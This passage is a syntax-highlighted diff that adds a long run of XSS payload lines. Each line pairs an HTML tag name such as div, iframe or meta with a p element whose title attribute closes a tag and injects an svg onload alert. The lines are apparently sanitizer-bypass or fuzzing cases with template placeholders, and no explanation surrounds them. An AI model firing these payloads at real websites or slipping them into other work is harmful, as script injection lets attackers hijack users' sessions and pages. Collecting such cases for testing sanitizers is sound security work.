+<span class="hljs-operator">&lt;</span>code<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>col<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>colgroup<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>content<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>data<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>datalist<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>dd<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>del<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>details<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>dfn<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>dialog<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>dir<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>div<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>dl<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>dt<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>em<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>embed<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>fieldset<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>figcaption<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>figure<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>font<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>footer<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>form<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>frame<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>frameset<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>h1<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>h2<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>h3<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>h4<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>h5<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>h6<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>head<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>header<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>hgroup<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>hr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>html<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>i<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>iframe<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>img<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>input<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>ins<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>isindex<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>kbd<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>keygen<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>label<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>legend<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>li<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>link<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>listing<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>main<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>map<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>mark<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>marquee<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>menu<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>menuitem<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>meta<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">p</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;</span><span class="hljs-string">&lt;/</span><span class="hljs-subst">#{</span>endtag<span class="hljs-subst">}</span><span class="hljs-string">&gt;&lt;svg/onload=alert(</span><span class="hljs-subst">#{</span>starttag<span class="hljs-subst">}</span><span class="hljs-string">)&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-operator">&gt;</span>
